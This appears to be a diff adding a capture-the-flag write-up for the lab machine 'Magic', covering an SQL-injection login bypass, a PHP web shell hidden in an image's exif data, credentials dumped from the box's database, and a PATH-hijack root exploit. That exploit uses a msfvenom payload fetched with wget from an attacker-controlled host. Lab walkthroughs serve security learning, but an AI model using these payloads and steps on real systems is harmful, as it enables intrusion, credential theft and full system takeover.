@@ -1,0 +1,70 @@
+> enum ,get available services.
+> enum http service,test with any vulnerabilities.
+> testing with sql injection,found new place,named upload.php.
+	>> capture request via burp and 
+	>> got a 302 redirect to 'http://magic.htb:80/upload.php'
+> at here we can bypass to logged in upload.php
+-----------------------------------------------------------------------------------
+POST /upload.php HTTP/1.1
+Host: magic.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://magic.htb/login.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=au4dne7r8i7753k6197prla9b8
+Upgrade-Insecure-Requests: 1
+
+username=admin&password=admin'
+------------------------------------------------------------------------------------
+> we can simple trick server by upload malicious code with fake jpg.
+
+$ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' shell.png
+
+> truthly couldnt connect via nc and bash so tried php-reverse-shell
+> enum in www-data dir,got db.php5,and we can get cred for db
+---------------------------------------------------
+private static $dbName = 'Magic' ;
+private static $dbHost = 'localhost' ;
+private static $dbUsername = 'theseus';
+private static $dbUserPassword = 'iamkingtheseus';
+---------------------------------------------------
+
+> we can try dump anything from db with that cred
+
+$ mysqldump -u theseus --password=iamkingtheseus --all-databases
+
+> got new cred >>> INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
+> we couldnt able to ssh theseus,so just have tried su and specify the pass Th3s3usW4sK1ng >> get user.txt
+> simple check linux privilege got interesting binary /bin/sysinfo
+$ file sysinfo
+sysinfo: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=9e9d26d004da0634c0747d16d377cd2a934e565a, not stripped
+root@kali:~/htb/Magic_185# strings sysinfo
+/lib64/ld-linux-x86-64.so.2
+.......
+====================Hardware Info====================
+lshw -short
+====================Disk Info====================
+fdisk -l
+====================CPU Info====================
+cat /proc/cpuinfo
+====================MEM Usage=====================
+free -h
+----------------------------------------------------
+
+> so we can make a fake 'cat' to get the root shell
+> i recommend to create fake cat with msfvenom and put it into /tmp of the box 
+
+$ wget http://yourip:port/cat -O /tmp/cat
+$ chmod +x /tmp/cat
+
+> use msf and multi/handler
+> make /bin/sysinfo use our fake cat first
+
+$ export PATH=/tmp:$PATH
+$ /bin/sysinfo
+>> get root shell
